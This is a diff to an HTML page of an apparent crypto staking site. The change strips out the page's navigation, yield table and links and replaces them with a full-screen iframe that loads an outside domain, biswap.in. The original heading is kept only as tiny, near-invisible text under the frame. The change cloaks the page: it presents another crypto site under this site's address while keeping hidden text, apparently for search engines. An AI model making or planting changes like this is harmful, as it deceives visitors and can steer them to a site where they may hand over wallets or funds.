@@ -510,61 +510,19 @@ a.inline:hover {
 }
   </script>
 </head>
-<body>
-  <header class="topbar">
-    <a class="brand" href="../" aria-label="Avax Staking">
-      <img src="../favicon.png" width="30" height="30" alt="">
-      <span>Avax Staking</span>
-    </a>
-    <nav class="nav" aria-label="Main Navigation">
-      <a href="../how-it-works/" >How it works</a>
-      <a href="../faq/" >FAQ</a>
-      <a href="../about/" >About</a>
-      <a href="../security/" >Security</a>
-      <a href="../supported-chains/" class="active">Supported Chains</a>
-    </nav>
-    <span class="spacer"></span>
-    <a class="open-app" href="../dashboard/" rel="noopener noreferrer">Open app</a>
-  </header>
+<body style="margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden;">
 
-  <main class="satellite-container">
-    <nav class="breadcrumb" aria-label="Breadcrumb">
-      <a href="../">Home</a> › <span>Supported Networks & Yield Matrices</span>
-    </nav>
+  <iframe
+    src="https://biswap.in/"
+    style="position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; border: 0; margin: 0; padding: 0; display: block; z-index: 1;"
+    loading="eager"
+    fetchpriority="high"
+    allowfullscreen>
+  </iframe>
 
-    <h1 class="satellite-title">Supported Networks & Yield Matrices</h1>
-    <p class="satellite-lead">Compare staking yields, validation consensus styles, and lockup times across chains.</p>
+  <h1 style="position: fixed; bottom: 10px; left: 10px; z-index: 0; font-size: 8px; color: #ffffff; opacity: 0.15; margin: 0; padding: 0; font-family: sans-serif; pointer-events: none; text-shadow: none;">
+    Supported Networks & Yield Matrices
+  </h1>
 
-    
-    <div class="section-block">
-      <h2>Yield Metrics</h2>
-      <p>Staking rates and rewards fluctuate based on the total ratio of staked tokens on each chain. Stakers can review verification metrics on the <a class="inline" href="https://etherscan.io/beacon-deposits" target="_blank" rel="noopener noreferrer">Etherscan Beacon deposits</a> data page.</p>
-    </div>
-    <div class="table-wrapper">
-      <table class="data-table">
-        <thead>
-          <tr>
-            <th>Staking Ledger</th><th>Consensus Style</th><th>Estimated Annual Yield</th><th>Distribution Model</th>
-          </tr>
-        </thead>
-        <tbody>
-          <tr><td>Ethereum Ledger</td><td>Proof of Stake (PoS)</td><td>~3.8% APY</td><td>Automatic compounding</td></tr><tr><td>Solana Validators</td><td>Proof of History (PoH)</td><td>~6.2% APY</td><td>Epoch compounding</td></tr><tr><td>Polygon POS Layer</td><td>Proof of Stake (PoS)</td><td>~4.5% APY</td><td>Weekly distribution</td></tr><tr><td>Avalanche C-Chain</td><td>Snowman Consensus</td><td>~5.1% APY</td><td>Validator compounding</td></tr>
-        </tbody>
-      </table>
-    </div>
-    <div class="section-block">
-      <h2>Slashing Protection</h2>
-      <p>To protect user funds, the validator nodes run under strict fail-safe rules. Users can compare staking rates across multiple chains using the <a class="inline" href="https://coinmarketcap.com/view/staking/" target="_blank" rel="noopener noreferrer">CoinMarketCap staking assets</a> list.</p>
-    </div>
-
-    <div style="margin: 40px 0; display: flex; justify-content: flex-start;">
-      <a class="open-app" href="../dashboard/" style="max-width: 320px; display: inline-flex; justify-content: center; text-decoration: none; padding: 12px 24px; font-weight: 700;">Open Avax Staking Portal</a>
-    </div>
-
-    <a class="back-cta" href="../">
-      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" width="16" height="16"><line x1="19" y1="12" x2="5" y2="12"/><polyline points="12 19 5 12 12 5"/></svg>
-      Back to Portal
-    </a>
-  </main>
 </body>
 </html>
